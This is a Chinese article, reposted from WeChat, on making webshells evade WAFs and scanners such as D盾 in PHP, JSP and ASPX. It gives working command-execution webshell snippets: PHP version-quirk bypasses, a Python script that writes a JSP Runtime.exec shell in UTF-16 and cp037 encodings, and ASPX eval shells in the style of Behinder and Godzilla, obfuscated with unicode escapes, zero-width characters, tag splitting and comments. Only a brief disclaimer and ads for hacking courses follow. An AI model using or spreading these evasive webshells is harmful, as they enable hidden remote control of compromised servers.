> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/388aEmtnyI6VSMnWaojSfw)

扫码领资料

获入门教程

免费 & 进群

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFJNibV2baHRo8G34MZhFD1sjTz4LHLiaKG9208VTU6pdTIEpC9jlW6UVfhIb9rHorCvvMsdiaya4T6Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png)

作者：Icepaper 

原文地址：https://xz.aliyun.com/t/10937

php 的免杀
-------

传统的 php 免杀不用多说了 无非就是各种变形和外部参数获取，对于一些先进的 waf 和防火墙来说，不论如何解析最终都会到达命令执行的地方，但是如果语法报错的话，就可能导致解析失败了，这里简单说几个利用 php 版本来进行语义出错的 php 命令执行方式。

### 一、利用在高版本 php 语法不换行来执行命令

```
<?=<br style="visibility: visible;">$a=<<< aa<br style="visibility: visible;">assasssasssasssasssasssasssasssasssasssasssassss<br style="visibility: visible;">aa;echo `whoami`<br style="visibility: visible;">?>
```

#### 5.2 版本报错

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUdvaf8aLq4kN0ev5hlnZp7MdgA6vWE1RAhtbJ1OrSoFWeqMcoU5JXicg/640?wx_fmt=png)

#### 5.3 报错

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUlkO3gLJmwQQbnkMyveHzZYe6MqHmE9p677mW6PZibZGkfRpGTgtHqFQ/640?wx_fmt=png)

#### 5.4 版本报错

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUyA10mMt1hJVfmdhsunhfmVL5orGqXOsZlWvKiawlSRmDK8J8RLMQ3EQ/640?wx_fmt=png)

#### 7.3.4 成功执行命令

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUIsBRsmBvT5oH2LTt0yADcibkQMhz5RK6LGzpVoOSAQPgYy2Ah2RcD3g/640?wx_fmt=png)

### 3、利用 \ 特殊符号来引起报错

```
<?php
\echo `whoami`;?>
```

#### 5.3 执行命令失败

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUAwrv7YeHI0icXPGBoZmYUPasUXDrXDOfoibGsPEXpPRYpDgvT7CA5R3Q/640?wx_fmt=png)

#### 7.3 执行命令失败

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUovPwXQd7tNYTKVHRTD4sgNoxC2BFzpKEtt4jNPkNCDXwia8Btov8EFQ/640?wx_fmt=png)

#### 5.2 成功执行

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUMibkRMC8WlZibD2TmwFKaeUIr7yEqLgFVfYDIoHHFfp9azf9tVs1WMlQ/640?wx_fmt=png)

3、十六进制字符串
---------

在 php7 中不认为是数字，php5 则依旧为数字

经过测试 5.3 和 5.5 可以成功执行命令，5.2 和 php7 无法执行

```
<?php
$s=substr("aabbccsystem","0x6");
$s(whoami)
?>
```

#### 7.3 命令执行失败

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUVaTqnC3mQGl1IUAia0DFYsmyYMbaw7NLK6IGicxCojzoTqyCTFBMG3ug/640?wx_fmt=png)

#### 5.2 命令执行失败

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCU1KQicUwXpwQJXsqlBeqsLPrA5lIKpO3cIRicPpFrBptftibQWg8gCKtag/640?wx_fmt=png)

### 5.3 命令执行成功

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCU1KQicUwXpwQJXsqlBeqsLPrA5lIKpO3cIRicPpFrBptftibQWg8gCKtag/640?wx_fmt=png)

除此之外，还有很多种利用版本差异性来 bypass 一些没有对所有版本进行检测更新的所谓的 "先进 waf"。

当然，对于我们可以结合垃圾数据，变形混淆，以及大量特殊字符和注释的方式来构造更多的 payload, 毕竟每家的 waf 规则不同，配置也不同，与一些传输层面的 bypass 进行结合产生的可能性就会非常多样。

例如：  
7.0 版本的?? 特性，如果版本为 5.x 的话就会报错，可以结合一些其他的方式吧

```
<?php
$a = $_GET['function'] ?? 'whoami';
$b = $_GET['cmd'] ?? 'whoami';
$a(null.(null.$b));
```

jsp 免杀
------

本人对 java 研究的不是非常深入，因此主要分享的还是平时收集的几个小 tips，如果有没看过的师傅现在看到了也是极好的，java unicode 绕过就不再多言。

#### 0、小小 Tips

jsp 的后缀可以兼容为 jspx 的代码，也兼容 jspx 的所有特性，如 CDATA 特性。

jspx 的后缀不兼容为 jsp 的代码，jspx 只能用 jspx 的格式

#### 1、jspx CDATA 特性

在 XML 元素里，< 和 & 是非法的，遇到 < 解析器会把该字符解释为新元素的开始，遇到 & 解析器会把该字符解释为字符实体化编码的开始。

但是我们有时候有需要在 jspx 里添加 js 代码用到大量的 < 和 & 字符，因此可以将脚本代码定义为 CDATA。

CDATA 部分内容会被解析器忽略。  
格式：<![CDATA[xxxxxxxxxxxxxxxxxxx]]>  
例如  
String cmd = request.getPar<![CDATA[ameter]]>("shell");  
此时 ameter 依旧会与 getPar 拼接成为 getParameter

#### 2、实体化编码

```
if (cmd !=null){
        Process child = Runtime.getRuntime().exec(cmd);
        InputStream in = child.getInputStream();
```

这里实体化编码先知渲染体现不出来

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUeVmzNYUctUWxT0hGgdiaUXHxlnA0IxHgOX5JicTricSfEn8ToOibliakViaA/640?wx_fmt=png)

#### 3、利用 java 支持其他编码格式来进行绕过

```
#python2
charset = "utf-8"
data = '''<%Runtime.getRuntime().exec(request.getParameter("i"));%>'''.format(charset=charset)

f16be = open('utf-16be.jsp','wb')
f16be.write('<%@ page contentType="charset=utf-16be" %>')
f16be.write(data.encode('utf-16be'))


f16le = open('utf-16le.jsp','wb')
f16le.write('<jsp:directive.page contentType="charset=utf-16le"/>')
f16le.write(data.encode('utf-16le'))

fcp037 = open('cp037.jsp','wb')
fcp037.write(data.encode('cp037'))
fcp037.write('<%@ page contentType="charset=cp037"/>')
```

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUAZwH9CWqUhuic0frAmicvtoVXom9d0h9iaCf9nVK1Zic0jwwWWZxibQWE3w/640?wx_fmt=png)

可以看到对于 D 盾的免杀效果还是非常好的。  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUZ9d18gvQVmzN6ImeIaTicjoVaTzCiaicdErVDehAHLeJA3UA5RWesC80Q/640?wx_fmt=png)

aspx 的免杀
--------

aspx 免杀的方式相对于 PHP 和 java 的较少，这里列出 5 种方式来 bypass 进行免杀

1、unicode 编码  
2、空字符串连接  
3、<%%> 截断  
3、头部替换  
5、特殊符号 @  
6、注释

我们以一个普通的冰蝎马作为示例

<%@ Page Language="Jscript"%>eval(@Request.Item["pass"],"unsafe");%

这一步无需多言，一定是会被 D 盾所查杀的

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUusqjDv6SibZNAPhqTut0HFaqialbIHOrgVHcxHK1VHGyhdKDODRjF5fA/640?wx_fmt=png)

#### 1、unicode 编码

例如 eval 他可以变为  
\u0065\u0076\u0061\u006c

```
ipt"%><%\u0065\u0076\u0061\u006c(@Request.Item["pass"],"unsafe");%>
```

经过我本地的测试，在 JScript 的情况下它不支持大 U 和多个 0 的增加  
而在 c# 的情况下，是可以支持的

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUZvT64xYcPNucRAJFpabmDYdA372vUxGV4BbpBJzL70xPfHZKJNwofw/640?wx_fmt=png)

#### 2、空字符串连接

在函数字符串中插入这些字符都不会影响脚本的正常运行，在测试前需要注意该类字符插入的位置，否则插入错误的地方会产生报错  
\u200c  
\u200d  
\u200e  
\u200f

#### 3、使用 <%%> 语法

将整个字符串与函数利用 <%%> 进行分割

```
Language=JS%><%eval%><%(Request.%><%Item["pass"],"unsafe");%>
```

#### 4、头部免杀

之前有遇到过检测该字段的 <%@ Page Language="C#" %>，这个是标识 ASPX 的一个字段，  
针对该字段进行免杀 %@Language=CSHARP% 很久之前修改为这样就过了

同样的，可以修改为  
<%@ Page Language="Jscript"%>------》<%@Page Language=JS%>  
也可以将该字段放在后面，不一定要放前面等

#### 5、使用符号

如哥斯拉 webshell 存在特征代码，可以添加 @符号但是不会影响其解析。

```
(Context.Session["payload"] == null)
(@Context.@Session["payload"] == null)
```

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUibFnVLP7jY3QpkXnMiam9r3d7jMCibCyKR43Ugj1WdtwUZLEMA5Xspn4A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFwr6MCl7a5Leyw8icSTvTCUayzH4qNRgQsicCbE5Uuc0m3OWkibGXf7x5qKFayaaAib0ia4sISBuCcoOA/640?wx_fmt=png)

#### 6、注释可以随意插入

如下所示为冰蝎部分代码

```
<%/*qi*/Session./*qi*/Add(@"k"/*qi*/,/*qi*/"e45e329feb5d925b"/*qi*/)
```

可以与 <%%> 结合使用效果会更好'

****声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。******所有渗透都需获取授权**！

@

**学习更多渗透技能！体验靶场实战练习**

```
（hack视频资料及工具）


```

（部分展示）

往期推荐

[

【精选】SRC 快速入门 + 上分小秘籍 + 实战指南



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247528604&idx=1&sn=5ab3a5b3eaf0c56fcdeabccadfdc6bde&chksm=ebea39b1dc9db0a71fa71d233709afdfd2e2e0483ded28cca42044eded300f1c7025bde1b37a&scene=21#wechat_redirect)

[

爬取免费代理，拥有自己的代理池



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247538507&idx=1&sn=012e95638679390d727ad9ac76f8093a&chksm=ebea1e66dc9d977076c87f955d303509c6a5dee9f498e18669ed25463d9403d7bd7fa2935277&scene=21#wechat_redirect)

[

漏洞挖掘｜密码找回中的套路



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247553371&idx=1&sn=28072033cc1b91a53ea3b48b9b070132&chksm=ebea5876dc9dd16059270c801801949f1b56d26ff76b4ca03b263f9d0228a62a068d1832fb7a&scene=21#wechat_redirect)

[

渗透测试岗位面试题 (重点：渗透思路)



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247552587&idx=1&sn=3c0717a556f8e2caea0310585da5f33f&chksm=ebea4766dc9dce70f29bb3be417198f68b985df1c420ef7e92958e34f766a1a043c3e3f86a6b&scene=21#wechat_redirect)

[

漏洞挖掘 | 通用型漏洞挖掘思路技巧



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247550572&idx=1&sn=02bc4368e4b6cd0a39ff1ec24a6aa9ad&chksm=ebea4f41dc9dc657549d9dff584294ba534cbdd7bb5205b1eabb07787300a0a58a899c15ac93&scene=21#wechat_redirect)

[

干货｜列了几种均能过安全狗的方法！



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247524943&idx=1&sn=98644144a3c10bb068ec0f310dcc4958&chksm=ebea2b62dc9da2749321fce7ab28788ced08a2b496e0a45b06a5887b5aa457e48f7a66110301&scene=21#wechat_redirect)

[

一名大学生的黑客成长史到入狱的自述



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247502926&idx=1&sn=8750295399cdcc5e71918c30bb1a974f&chksm=ebea8563dc9d0c75cdf709d2d16fdbdf82abee64516f7a44347f40056969d1b4bc3a1eb2ab2e&scene=21#wechat_redirect)

[

攻防演练｜红队手段之将蓝队逼到关站！



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247541662&idx=1&sn=343a8d7764dde2121f6b0373aa4dbd28&chksm=ebea6ab3dc9de3a5ad1f7eadd96bd2d42375d7f4c40bd8c4ea4b4dc000415097a0e3fe0fbd38&scene=21#wechat_redirect)

[巧用 FOFA 挖到你的第一个漏洞](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247521952&idx=1&sn=55ab0613e5a7ba79b78849b4d91451f6&chksm=ebeadf8ddc9d569bcc64e99414dcbe6878a0b2c9f5c057b30c4bbe465ba76fcaa64e66caa0c2&scene=21#wechat_redirect)

**看到这里了，点个 “赞”、“再看” 吧**